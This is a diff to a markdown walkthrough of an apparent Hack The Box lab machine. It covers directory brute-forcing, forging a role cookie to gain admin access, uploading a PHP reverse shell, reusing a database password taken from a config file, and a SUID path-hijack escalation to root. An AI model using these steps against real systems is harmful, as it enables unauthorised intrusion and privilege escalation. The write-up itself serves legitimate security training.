@@ -34,13 +34,12 @@ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://$IP/
 ```
 
 **Boring exploit to gain admin access**:
+
 Duh!! try using crawler from Burp-Suite to build Site-Map(listening all traffic to build a map), found: `/cdn-cgi/login/`
 
 Login as guest --> uploads --> This action require super admin 
-
 Login as guest --> account --> ?content=accounts&id=2 = [2233]guest--> ?content=accounts&id=1 --> [34322]admin
-
-check cookies --> user=2233 && role=guest--> user=34322 && role=admin
+Check cookies --> user=2233 && role=guest--> user=34322 && role=admin --> *ADMIN HERE!!*
 
 Upload php-reverse-shell.php --> trigger by `/uploads/php-reverse-shell.php` --> *reverse shell here!!*
 
@@ -61,18 +60,20 @@ From `/var/www/html/cdn-cgi/login/db.php`:
 $conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
 ?>
 ```
-Sweet, let's switch to `robert` account, `www-data` is lowest privilege account do you known
+Sweet, let's switch to `robert` account, `www-data` is lowest and boring privileges to messing around!!
 ```bash
 su robert
 # Password: M3g4C0rpUs3r!
 ```
 From `/home/robert/user.txt`:
+
 **user flag**: `HTB{f2c74ee8db7983851ab2a96a44eXXXXX}` 
 
-**find executable file bugtracker group**: `find / -group bugtracker -type f 2>/dev/null` --> `/usr/bin/bugtracker`
+**Find executable file bugtracker group**: `find / -group bugtracker -type f 2>/dev/null` --> `/usr/bin/bugtracker`
+
 This also can be done by finding SUID file: `-perm u=s`
 
-`/usr/bin/bugtracker` is SUID(set owner user id) by root 
+`/usr/bin/bugtracker` is SUID(set owner user id) by root(executed under privileges of root)
 ```bash
 /usr/bin/bugtracker
 # Enter bug ID: 1000 --> error --> cat: /root/reports/10000 --> the executable being called in an insecure manner(not being called full path)
@@ -86,4 +87,5 @@ whoami # root
 ```
 
 From `/root/root.txt`:
+
 **root flag**: `HTB{af13b0bee69f8a877c3faf667f7XXXXX}`
